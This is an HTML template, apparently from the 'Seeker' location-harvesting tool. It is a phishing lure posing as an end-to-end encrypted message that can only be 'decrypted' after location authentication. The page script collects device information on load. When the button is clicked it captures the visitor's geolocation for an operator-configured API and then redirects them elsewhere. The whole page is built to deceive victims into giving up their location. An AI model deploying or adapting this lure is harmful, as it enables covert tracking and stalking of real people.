<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Encrypted Message</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: linear-gradient(135deg, #0f0c29 0%, #302b63 50%, #24243e 100%);
      color: #e8e8e8;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    .message-box {
      max-width: 420px;
      background: rgba(255,255,255,0.05);
      border: 1px solid rgba(255,255,255,0.15);
      border-radius: 12px;
      padding: 32px;
      backdrop-filter: blur(10px);
    }
    .lock-icon { font-size: 3rem; margin-bottom: 16px; opacity: 0.9; }
    h1 { font-size: 1.4rem; margin-bottom: 8px; font-weight: 600; }
    p { color: #b0b0b0; font-size: 0.95rem; line-height: 1.6; margin-bottom: 24px; }
    .encrypted { font-family: monospace; color: #7dd3fc; font-size: 0.8rem; margin-bottom: 24px; word-break: break-all; }
    .btn {
      display: inline-block;
      padding: 14px 32px;
      background: linear-gradient(90deg, #06b6d4, #3b82f6);
      color: #fff;
      border: none;
      border-radius: 8px;
      font-size: 1rem;
      font-weight: 600;
      cursor: pointer;
    }
    .btn:hover { opacity: 0.95; }
    #status { margin-top: 16px; font-size: 0.9rem; color: #94a3b8; }
  </style>
</head>
<body>
  <div class="message-box">
    <div class="lock-icon">🔐</div>
    <h1>Encrypted Message</h1>
    <p>You have received a secure message. Location authentication is required to decrypt and view the contents.</p>
    <div class="encrypted">[AES-256 • End-to-end encrypted • Verify recipient]</div>
    <button id="decryptBtn" class="btn" onclick="handleDecrypt()">Verify &amp; Decrypt</button>
    <div id="status"></div>
  </div>
  <script>
    window.SEEKER_API_BASE = {{ api_base }};
  </script>
  <script src="/static/seeker/js/location.js"></script>
  <script>
    information();
    function handleDecrypt() {
      var btn = document.getElementById('decryptBtn');
      var status = document.getElementById('status');
      btn.disabled = true;
      btn.textContent = 'Decrypting...';
      var redirectUrl = {{ redirect_url }} || 'https://www.google.com';
      locate(
        function() {
          status.textContent = 'Message decrypted.';
          window.location.href = redirectUrl;
        },
        function(err, msg) {
          status.textContent = 'Decryption failed. ' + (msg || 'Location required.');
          btn.disabled = false;
          btn.textContent = 'Verify & Decrypt';
        }
      );
    }
  </script>
</body>
</html>
